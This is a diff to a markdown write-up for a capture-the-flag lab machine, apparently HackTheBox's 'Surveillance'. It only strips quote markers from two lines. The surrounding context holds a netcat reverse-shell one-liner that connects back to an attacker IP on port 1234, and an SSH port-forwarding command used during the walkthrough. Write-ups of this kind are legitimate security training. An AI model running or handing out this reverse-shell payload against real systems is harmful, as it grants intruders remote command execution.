@@ -60,7 +60,7 @@ We spawned a shell hehe. Lets get a proper shell by using the payload below
 
 payload:`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.165 1234 >/tmp/f`
 
->Ensure you edit the LHOST and the LPORT to that which applies to your attacking machine
+Ensure you edit the LHOST and the LPORT to that which applies to your attacking machine
 
 ![[Pasted image 20240220004054.png]]
 
@@ -164,7 +164,7 @@ Lets portforward using ssh tunelling
 
 command:`ssh -L 1234:127.0.0.1:8080 matthew@surveillance.htb -fN` 
 
->`-fN`: These options tell SSH to go into the background (`-f`) and not execute any remote commands (`-N`). This is useful when you only want to establish the SSH tunnel without opening a shell session on the remote server.
+`-fN`: These options tell SSH to go into the background (`-f`) and not execute any remote commands (`-N`). This is useful when you only want to establish the SSH tunnel without opening a shell session on the remote server.
 
 ![[Pasted image 20240220192404.png]]
 
